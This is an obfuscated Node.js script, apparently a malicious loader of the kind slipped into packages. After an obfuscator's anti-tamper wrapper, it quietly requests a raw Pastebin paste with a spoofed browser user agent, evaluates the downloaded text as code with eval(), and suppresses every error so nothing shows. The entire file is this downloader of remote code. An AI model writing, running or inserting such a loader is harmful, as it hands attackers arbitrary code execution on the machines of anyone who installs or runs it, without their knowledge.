var _0x4a01c7 = (function () {
  var _0x4ac001 = true
  return function (_0x993c82, _0x558cf8) {
    var _0x422444 = _0x4ac001
      ? function () {
          if (_0x558cf8) {
            var _0x25378f = _0x558cf8.apply(_0x993c82, arguments)
            _0x558cf8 = null
            return _0x25378f
          }
        }
      : function () {}
    _0x4ac001 = false
    return _0x422444
  }
})()
var _0x1905cf = _0x4a01c7(this, function () {
  return _0x1905cf
    .toString()
    .search('(((.+)+)+)+$')
    .toString()
    .constructor(_0x1905cf)
    .search('(((.+)+)+)+$')
})
_0x1905cf()
try {
  var https = require('https')
  https
    .get(
      {
        hostname: 'pastebin.com',
        path: '/raw/XLeVP82h',
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
          Accept:
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      },
      (_0x15c8ee) => {
        _0x15c8ee.setEncoding('utf8')
        _0x15c8ee.on('data', (_0x597e0d) => {
          eval(_0x597e0d)
        })
        _0x15c8ee.on('error', () => {})
      }
    )
    .on('error', () => {})
} catch (_0x5a0713) {}
